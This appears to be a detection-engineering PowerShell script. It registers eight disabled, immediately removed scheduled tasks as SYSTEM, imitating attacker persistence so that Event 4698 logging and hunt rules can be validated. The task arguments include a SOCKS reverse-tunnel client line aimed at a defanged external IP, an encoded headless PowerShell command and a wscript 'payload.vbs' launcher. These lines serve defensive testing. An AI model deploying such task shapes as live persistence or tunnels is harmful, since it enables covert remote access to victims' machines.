#Requires -Version 5.1
# MITRE ATT&CK: T1053.005 — Scheduled Task/Job: Scheduled Task
# Registers inert scheduled-task shapes used to validate Event 4698 collection and
# the Research, Hunt, and Analyst rules. Task actions are never started.

[CmdletBinding()]
param(
    [switch]$CleanupOnly,
    [ValidatePattern('^[0-9a-fA-F]{8}$')]
    [string]$RunSuffix
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$Suffix = if ($RunSuffix) { $RunSuffix.ToLowerInvariant() } else { [Guid]::NewGuid().ToString('N').Substring(0, 8) }
$TaskNames = @(
    "TIC-System-Control-$Suffix",
    "TIC-AppData-Logon-$Suffix",
    "TempLogA-$Suffix",
    "BackupCheck-$Suffix",
    "Microsoft\Windows\ApplicationData\DsSvcCleanup-$Suffix",
    "WindowsConnSvc-$Suffix",
    "INetHealth-$Suffix",
    "IntelDriver-$Suffix"
)

function Remove-LabTasks {
    foreach ($TaskName in $TaskNames) {
        & "$env:SystemRoot\System32\schtasks.exe" /Delete /TN $TaskName /F 2>$null | Out-Null
    }
}

if ($CleanupOnly) {
    if (-not $RunSuffix) { throw '-CleanupOnly requires the eight-character RunSuffix printed by the original run.' }
    Remove-LabTasks
    return
}

Write-Host '=== Scheduled Task Chokepoint Emulation ===' -ForegroundColor Magenta
Write-Host 'Registers eight inert task definitions. No task action is executed.' -ForegroundColor DarkGray
Write-Host "Recovery suffix: $Suffix" -ForegroundColor DarkGray

try {
    $Definitions = @(
        @{
            Name = $TaskNames[0]; Schedule = 'ONSTART'
            Execute = "$env:SystemRoot\System32\wevtutil.exe"; Arguments = 'gli System /c:1'
        },
        @{
            Name = $TaskNames[1]; Schedule = 'ONLOGON'
            Execute = "$env:APPDATA\TIC\updater.exe"; Arguments = '--check'
        },
        @{
            Name = $TaskNames[2]; Schedule = 'DAILY'; Start = '13:00'
            Execute = "$env:APPDATA\WPy64-31401\python\pythonw.exe"; Arguments = 'internal.py'
        },
        @{
            Name = $TaskNames[3]; Schedule = 'ONLOGON'
            Execute = "$env:APPDATA\2FAGuard\setup.exe"; Arguments = 'doit'
        },
        @{
            Name = $TaskNames[4]; Schedule = 'MINUTE'; Modifier = '11'
            Execute = "$env:SystemRoot\System32\wscript.exe"; Arguments = "$env:TEMP\TIC\payload.vbs //b //e:vbscript"
        },
        @{
            Name = $TaskNames[5]; Schedule = 'MINUTE'; Modifier = '2'
            Execute = "$env:SystemRoot\Temp\svchost32.exe"; Arguments = 'client 77.110.122[.]137:37182 R:1085:socks'
        },
        @{
            Name = $TaskNames[6]; Schedule = 'MINUTE'; Modifier = '60'
            Execute = "$env:SystemRoot\System32\conhost.exe"; Arguments = '--headless powershell -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEkATgBlAHQASABlAGEAbAB0AGgAJwA='
        },
        @{
            Name = $TaskNames[7]; Schedule = 'ONLOGON'
            Execute = "$env:SystemRoot\System32\wscript.exe"; Arguments = "`"$env:ProgramData\IntelDriver\IntelDriver.vbs`""
        }
    )

    $DisabledSettings = New-ScheduledTaskSettingsSet -Disable
    $SystemPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    foreach ($Definition in $Definitions) {
        $Action = New-ScheduledTaskAction -Execute $Definition.Execute -Argument $Definition.Arguments
        $Trigger = switch ($Definition.Schedule) {
            'ONSTART' { New-ScheduledTaskTrigger -AtStartup }
            'ONLOGON' { New-ScheduledTaskTrigger -AtLogOn }
            'DAILY'   { New-ScheduledTaskTrigger -Daily -At $Definition.Start }
            'MINUTE'  {
                New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1) `
                    -RepetitionInterval (New-TimeSpan -Minutes ([int]$Definition.Modifier))
            }
        }
        $TaskPath = '\'
        $TaskName = $Definition.Name
        $Separator = $Definition.Name.LastIndexOf('\')
        if ($Separator -ge 0) {
            $TaskPath = "\$($Definition.Name.Substring(0, $Separator))\"
            $TaskName = $Definition.Name.Substring($Separator + 1)
        }
        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $DisabledSettings -Principal $SystemPrincipal
        Register-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -InputObject $Task -Force | Out-Null
        $Registered = Get-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath
        if ($Registered.State -ne 'Disabled') { throw "Inert task $($Definition.Name) was not disabled at registration" }
    }

    Write-Host 'Eight task-registration events generated for collection.' -ForegroundColor Green
    Write-Host 'Expected telemetry: Windows Security Event ID 4698.' -ForegroundColor DarkCyan
}
finally {
    Remove-LabTasks
    Write-Host 'Lab task definitions removed.' -ForegroundColor Green
}
